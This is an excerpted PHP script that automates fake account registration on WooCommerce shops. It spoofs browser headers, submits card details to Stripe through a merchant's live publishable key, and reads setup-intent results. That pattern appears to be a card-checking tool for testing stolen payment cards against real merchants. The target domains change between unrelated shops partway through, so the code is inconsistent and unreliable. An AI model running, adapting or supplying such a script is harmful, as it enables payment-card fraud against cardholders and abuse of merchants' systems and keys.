...
$get_url = "https://euniqyou.com/my-account/";
...
#echo "new register_nonce: " . $register_nonce . "\n";

$create_url = "https://shop.mrs-electronic.com/my-account/?action=register";
...
$create_headers = [
    ...
    "origin: https://shop.mrs-electronic.com",
    "priority: u=0, i",
    "referer: https://shop.mrs-electronic.com/my-account/",
    'sec-ch-ua: "Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',
    "sec-ch-ua-mobile: ?0",
    'sec-ch-ua-platform: "Windows"',
    "sec-fetch-dest: document",
...
$create_data = http_build_query([
    "username" => $email,
    "email" => $email,
    "password" => "dsag34twfadca",
    "wc_country_select" => "US",
    "wc_postal_code" => "94545",
    ...
    "wc_order_attribution_session_entry" => "https://womencreate.com/my-account/",
    "wc_order_attribution_session_start_time" => "2025-06-22 08:23:51",
...
$pay_url = "https://womencreate.com/my-account/add-payment-method/";
...
$pay_headers = [
    ...
    "accept-language: en-US,en;q=0.9",
    "priority: u=0, i",
    "referer: https://womencreate.com/my-account/add-payment-method/",
    'sec-ch-ua: "Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',
    "sec-ch-ua-mobile: ?0",
    'sec-ch-ua-platform: "Windows"',
    "sec-fetch-dest: document",
...
$st_payload = http_build_query([
    ...
    "card[exp_month]" => $mm,
    "card[exp_year]" => $yy,
    "referrer" => "https://womencreate.com",
    "key" => "pk_live_51N83r4Bj2VrbWSeYrqtKBdsSEchEIO6hgL9aLc8CqUCQgPxbKfKbqjP9bKU1CnFZVMFqiupa65mf0OSJuy3GlEk3000B9OcUad"
]);
...
#echo '<span class="text text-success">payment_method_id</span> <span class="text text-success">➔ '.$payment_method_id.'</span><br>';

$cseti_url = "https://womencreate.com/?wc-ajax=wc_stripe_create_and_confirm_setup_intent";
...
#echo '<span class="text text-success">cseti_response</span> <span class="text text-success">➔ '.$cseti_response.'</span><br>';
...
if ($securestate === 'requires_action') {
    ...
    if (($state == "succeeded") || ($state == "attempted") || ($state == "processing_error")){
        ...
        $get_url = "https://api.stripe.com/v1/setup_intents/{$cintent}?is_stripe_sdk=false&client_secret={$csecret}&key=pk_live_51N83r4Bj2VrbWSeYrqtKBdsSEchEIO6hgL9aLc8CqUCQgPxbKfKbqjP9bKU1CnFZVMFqiupa65mf0OSJuy3GlEk3000B9OcUad";
